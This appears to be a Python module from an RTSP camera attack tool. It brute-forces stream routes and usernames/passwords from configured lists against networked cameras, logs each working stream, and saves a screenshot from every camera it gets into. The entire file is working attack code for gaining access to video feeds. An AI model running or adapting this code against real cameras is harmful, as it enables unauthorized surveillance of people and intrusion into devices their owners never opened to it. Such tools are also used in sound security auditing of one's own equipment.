import logging
import sys

import av
from colorama import Fore, Style

from modules import utils
from modules.rtsp import RTSPClient, Status

sys.path.append("..")
import config

dummy_route = "/0x8b6c42"
logger = logging.getLogger("debugger")


def attack(target: RTSPClient, route=None, credentials=None):
    if route is None:
        route = target.route
    if credentials is None:
        credentials = target.credentials

    # Create socket connection.
    ok = target.connect()
    if not ok:
        if target.status is Status.UNIDENTIFIED:
            logger.debug(
                f"Failed to connect {str(target)}:", exc_info=target.last_error
            )
        else:
            logger.debug(f"Failed to connect {str(target)}: {target.status.name}")
        return False

    attack_url = RTSPClient.get_rtsp_url(target.ip, target.port, credentials, route)
    # Try to authorize: create describe packet and send it.
    ok = target.authorize(route, credentials)
    request = "\n\t".join(target.packet.split("\r\n")).rstrip()
    if target.data:
        response = "\n\t".join(target.data.split("\r\n")).rstrip()
    else:
        response = ""
    logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
    if not ok:
        logger.debug(f"Failed to authorize {attack_url}", exc_info=target.last_error)
        return False

    return True


def attack_route(target: RTSPClient):
    # If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
    # If it's a 200, the stream is accessed successfully.
    ok_codes = ["200", "401", "403"]

    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    ok = attack(target, route=dummy_route)
    if ok and any(code in target.data for code in ok_codes):
        target.routes.append("/")
        return target

    # Otherwise, bruteforce the routes.
    for route in config.ROUTES:
        ok = attack(target, route=route)
        if not ok:
            return False
        if any(code in target.data for code in ok_codes):
            target.routes.append(route)
            return target


def attack_credentials(target: RTSPClient):
    def _log_working_stream():
        logging.info(f"{Style.DIM}Working stream at {str(target)}{Style.RESET_ALL}")
        logger.debug(
            f"Working stream at {str(target)} with {target.auth_method.name} auth"
        )

    if target.is_authorized:
        _log_working_stream()
        return target

    # If it's a 404, it means that the route is incorrect but the credentials might be okay.
    # If it's a 200, the stream is accessed successfully.
    ok_codes = ["200", "404"]

    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    ok = attack(target, credentials=":")
    if ok and any(code in target.data for code in ok_codes):
        _log_working_stream()
        return target

    # Otherwise, bruteforce the routes.
    for cred in config.CREDENTIALS:
        ok = attack(target, credentials=cred)
        if not ok:
            return False
        if any(code in target.data for code in ok_codes):
            target.credentials = cred
            _log_working_stream()
            return target


def get_screenshot(target: RTSPClient, tries=0) -> str:
    file_name = utils.escape_chars(f"{str(target).lstrip('rtsp://')}.jpg")
    file_path = config.PICS_FOLDER / file_name

    try:
        with av.open(
            str(target),
            options={
                "rtsp_transport": "tcp",
                "rtsp_flags": "prefer_tcp",
                "stimeout": "3000000",
            },
            timeout=60.0,
        ) as video:
            if (
                video.streams.video[0].profile is None
                and video.streams.video[0].start_time is None
                and video.streams.video[0].codec_context.format is None
            ):
                # There's a high possibility that this video stream is broken
                # or something else, so we try again just to make sure
                if tries == 2:
                    video.close()
                    tries += 1
                    return get_screenshot(target, tries)
                else:
                    logger.debug(
                        f"Broken video stream or unknown issues with {str(target)}"
                    )
                    return ""
            video.streams.video[0].thread_type = "AUTO"
            for frame in video.decode(video=0):
                frame.to_image().save(file_path)
                break
    except (MemoryError, PermissionError, av.InvalidDataError) as e:
        # Those errors occurs when there's too much SCREENSHOT_THREADS.
        logger.debug(f"Missed screenshot of {str(target)}: {repr(e)}")
        # Try one more time in hope for luck.
        if tries == 2:
            tries += 1
            logging.info(
                f"{Fore.YELLOW}Retry to get a screenshot of the {str(target)}{Style.RESET_ALL}"
            )
            return get_screenshot(target, tries)
        else:
            logging.warning(
                f"{Fore.RED}Missed screenshot of {str(target)}: if you see this message a lot - consider lowering SCREENSHOT_THREADS ({config.SCREENSHOT_THREADS}){Style.RESET_ALL}"
            )
            return ""
    except Exception as e:
        logger.debug(f"get_screenshot failed with {str(target)}: {repr(e)}")
        return ""

    logging.info(
        f"{Style.BRIGHT}Captured screenshot for {str(target)}{Style.RESET_ALL}"
    )
    logger.debug(f"Captured screenshot for {str(target)}")
    return file_path
